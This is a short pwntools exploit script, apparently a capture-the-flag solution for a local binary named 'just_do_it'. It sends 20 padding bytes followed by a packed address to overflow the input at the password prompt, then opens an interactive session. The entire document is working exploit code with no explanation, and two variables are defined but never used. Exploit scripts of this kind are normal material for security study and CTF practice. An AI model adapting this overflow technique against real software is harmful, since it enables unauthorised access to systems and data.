from pwn import *

terminate = b'\x00'
password = b'P@SSW0RD'

padding = b"0"*20
address = p32(0x0804a080)

payload = padding
payload += address

p = process('./just_do_it')
p.recvuntil(b'the password?')
print(payload)
p.send(payload)

p.interactive()
